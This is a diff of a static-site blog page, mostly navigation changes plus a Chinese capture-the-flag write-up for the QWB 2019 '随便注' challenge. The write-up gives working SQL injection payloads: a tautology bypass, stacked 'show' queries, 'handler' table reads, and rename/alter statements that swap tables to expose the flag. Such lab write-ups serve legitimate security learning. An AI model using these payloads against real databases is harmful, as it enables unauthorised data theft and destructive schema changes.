@@ -1904,6 +1904,10 @@
       
         
       
+        
+      
+        
+      
     
     
     
@@ -1999,6 +2003,36 @@
     
   
     JS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../php/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PHP
   
 
     
@@ -2603,6 +2637,36 @@
   
   
     <li class="md-nav__item">
+      <a href="../%E6%B5%81%E5%8C%85%E8%A3%85%E5%99%A8/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    流包装器
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
       <a href="../%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86/" class="md-nav__link">
         
   
@@ -2800,7 +2864,7 @@
   <div class="md-post__content md-typeset">
     <h2 id="2019"><a class="toclink" href="../../qwb2019-suibianzhu/">[强网杯 2019] 随便注</a></h2>
 <p>先试万能密码：</p>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="mi">1</span><span class="err">'</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">-- -</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="mi">1</span><span class="err">'</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">-- -</span>
 </span></code></pre></div>
 <p>看着是没什么用的。</p>
 <p>接着试其他的，发现了 <code>select</code> 等被过滤了：</p>
@@ -2809,14 +2873,14 @@
 <p>还有一处容易漏看：过滤名单里带了 <code>\.</code>（点）。<strong>点被挡，意味着 <code>information_schema.tables</code> 这种写法根本发不出去</strong> —— 所以后面查表只能靠 <code>show tables</code>，不是因为我们想省 <code>select</code>，是因为连表名都没法用点拼出来。</p>
 <p>那就试试<strong>堆叠注入</strong>。堆叠查询可以一次执行多条独立语句，<code>show</code>、<code>handler</code>、<code>rename</code>、<code>alter</code> 这些都不需要 <code>select</code>，正好绕开过滤。</p>
 <p>发现可以。那么就分别进行查表和查列：</p>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="mi">1</span><span class="err">'</span><span class="p">;</span><span class="k">show</span><span class="w"> </span><span class="n">tables</span><span class="p">;</span><span class="c1">-- -</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="mi">1</span><span class="err">'</span><span class="p">;</span><span class="k">show</span><span class="w"> </span><span class="n">tables</span><span class="p">;</span><span class="c1">-- -</span>
 </span></code></pre></div>
 <p><img alt="查表" src="../../../assets/images/qwb2019-suibianzhu/02-show-tables.png" /></p>
 <p>查到两个表：<code>1919810931114514</code> 和 <code>words</code>。</p>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="mi">1</span><span class="err">'</span><span class="p">;</span><span class="k">show</span><span class="w"> </span><span class="n">columns</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="o">`</span><span class="mi">1919810931114514</span><span class="o">`</span><span class="p">;</span><span class="c1">-- -</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="mi">1</span><span class="err">'</span><span class="p">;</span><span class="k">show</span><span class="w"> </span><span class="n">columns</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="o">`</span><span class="mi">1919810931114514</span><span class="o">`</span><span class="p">;</span><span class="c1">-- -</span>
 </span></code></pre></div>
 <p><img alt="数字表的列" src="../../../assets/images/qwb2019-suibianzhu/03-columns-flag.png" /></p>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="mi">1</span><span class="err">'</span><span class="p">;</span><span class="k">show</span><span class="w"> </span><span class="n">columns</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="o">`</span><span class="n">words</span><span class="o">`</span><span class="p">;</span><span class="c1">-- -</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="mi">1</span><span class="err">'</span><span class="p">;</span><span class="k">show</span><span class="w"> </span><span class="n">columns</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="o">`</span><span class="n">words</span><span class="o">`</span><span class="p">;</span><span class="c1">-- -</span>
 </span></code></pre></div>
 <p><img alt="words 表的列" src="../../../assets/images/qwb2019-suibianzhu/04-columns-words.png" /></p>
 <p><code>words</code> 表里没有 flag。</p>
@@ -2825,9 +2889,9 @@
 <p><code>handler</code> 就是直接打开一张表、按行读：</p>
 <p><img alt="handler 的用法" src="../../../assets/images/qwb2019-suibianzhu/05-handler-syntax.png" /></p>
 <p>通过 <code>handler</code> 可以直接查询到 flag：</p>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="mi">1</span><span class="err">'</span><span class="p">;</span><span class="k">handler</span><span class="w"> </span><span class="o">`</span><span class="mi">1919810931114514</span><span class="o">`</span><span class="w"> </span><span class="k">open</span><span class="p">;</span>
-</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="k">handler</span><span class="w"> </span><span class="o">`</span><span class="mi">1919810931114514</span><span class="o">`</span><span class="w"> </span><span class="k">read</span><span class="w"> </span><span class="k">first</span><span class="p">;</span>
-</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="k">handler</span><span class="w"> </span><span class="o">`</span><span class="mi">1919810931114514</span><span class="o">`</span><span class="w"> </span><span class="k">close</span><span class="p">;</span><span class="c1">-- -</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="mi">1</span><span class="err">'</span><span class="p">;</span><span class="k">handler</span><span class="w"> </span><span class="o">`</span><span class="mi">1919810931114514</span><span class="o">`</span><span class="w"> </span><span class="k">open</span><span class="p">;</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="k">handler</span><span class="w"> </span><span class="o">`</span><span class="mi">1919810931114514</span><span class="o">`</span><span class="w"> </span><span class="k">read</span><span class="w"> </span><span class="k">first</span><span class="p">;</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="k">handler</span><span class="w"> </span><span class="o">`</span><span class="mi">1919810931114514</span><span class="o">`</span><span class="w"> </span><span class="k">close</span><span class="p">;</span><span class="c1">-- -</span>
 </span></code></pre></div>
 <p>得到 flag。</p>
 <p><strong>注意</strong>：作为表名的数字要用反引号括起来 —— <code>1919810931114514</code> 是一个以数字开头的名字，不加引号 MySQL 不认它是标识符。Linux 下单引号和反引号都可以（单引号在进 MySQL 之前就被 shell 吃掉了），Windows 下只能用反引号。</p>
@@ -2836,19 +2900,19 @@
 <p>首先通过 <code>1' -- -</code> 的回显判断出是<strong>单引号闭合</strong>的。</p>
 <p>再通过 <code>show</code> 堆叠查询到两个表，通过查询发现 <code>words</code> 中有两个列，但是那个数字表中只有一个列。</p>
 <p>那么因为在初始查询的时候它返回的是<strong>两个列</strong>，所以这里就知道了它的语句是：</p>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">words</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="err">列</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'1'</span><span class="p">;</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">words</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="err">列</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'1'</span><span class="p">;</span>
 </span></code></pre></div>
 <p>至于为什么是 <code>select *</code>，是因为它回显有两个列；一个列返回的是数字，一个列返回的是数据，这里就可以知道查询的是 <code>id</code> 了。</p>
 <p>所以最初的查询语句应该为：</p>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">words</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'$inject'</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">words</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'$inject'</span>
 </span></code></pre></div>
 <p>所以到了这里我们就可以利用它固定的原始语句来查询了。既然它查的表名列名分别为 <code>words</code> 和 <code>id</code>，那我们就把 flag 所在的表名和列名修改为 <code>words</code> 和 <code>id</code>：</p>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="mi">1</span><span class="err">'</span><span class="p">;</span><span class="k">rename</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">words</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">everything</span><span class="p">;</span>
-</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="k">rename</span><span class="w"> </span><span class="o">`</span><span class="mi">1919810931114514</span><span class="o">`</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">words</span><span class="p">;</span>
-</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="k">alter</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">words</span><span class="w"> </span><span class="n">change</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span><span class="c1">-- -</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="mi">1</span><span class="err">'</span><span class="p">;</span><span class="k">rename</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">words</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">everything</span><span class="p">;</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="k">rename</span><span class="w"> </span><span class="o">`</span><span class="mi">1919810931114514</span><span class="o">`</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">words</span><span class="p">;</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="k">alter</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">words</span><span class="w"> </span><span class="n">change</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span><span class="c1">-- -</span>
 </span></code></pre></div>
 <p>接着再用万能密码：</p>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="mi">1</span><span class="err">'</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">-- -</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="mi">1</span><span class="err">'</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">-- -</span>
 </span></code></pre></div>
 <p><img alt="拿到 flag" src="../../../assets/images/qwb2019-suibianzhu/07-flag.png" /></p>
 <p>成功得到 flag。</p>
